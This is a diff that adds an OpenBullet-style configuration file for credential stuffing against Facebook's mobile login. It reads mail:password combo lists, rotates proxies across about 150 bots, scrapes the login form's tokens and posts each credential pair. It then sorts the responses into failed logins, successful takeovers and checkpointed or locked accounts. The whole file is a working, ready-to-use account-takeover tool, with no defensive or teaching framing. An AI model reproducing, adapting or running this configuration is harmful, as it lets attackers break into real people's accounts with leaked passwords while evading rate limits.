@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "Facebook",
+  "SuggestedBots": 150,
+  "LastModified": "2019-06-02T22:14:28.0567167-05:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "ArturoPendragon (loliX Encrypted)",
+  "Version": "1.2.1.3",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://m.facebook.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Host: m.facebook.com" 
+  HEADER "Proxy-Connection: keep-alive" 
+  HEADER "Referer: https://m.facebook.com/?zero_e=6&zero_et=1513734268&_rdc=1&_rdr&refsrc=https%3A%2F%2F0.facebook.com%2F" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" LR "\" name=\"lsd\" value=\"" "\"" -> VAR "lsd" 
+
+PARSE "<SOURCE>" LR "m_ts\" value=\"" "\" " -> VAR "ts" 
+
+REQUEST POST "https://m.facebook.com/login.php?refsrc=https%3A%2F%2F0.facebook.com%2F&lwv=100&refid=8" 
+  CONTENT "lsd=<lsd>&m_ts=<ts>&li=psTwXAV_u0cO0WwyyCfRrrvU&try_number=0&unrecognized_tries=0&email=<USER>&pass=<PASS>&login=Log%2BIn" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "==========FACEBOOK= = ==========" -> CAP "=" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "El correo electrónico que ingresaste no coincide con ninguna cuenta" 
+    KEY "A senha que você inseriu está incorreta" 
+    KEY "Invalid username or password" 
+    KEY "Log into Facebook | Facebook" 
+    KEY "La contraseña que ingresaste es incorrecta" 
+  KEYCHAIN Success OR 
+    KEY "Iniciar sesión con un toque" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Confirma tu identidad" 
+    KEY "Tu cuenta está temporalmente bloqueada" 
+
+
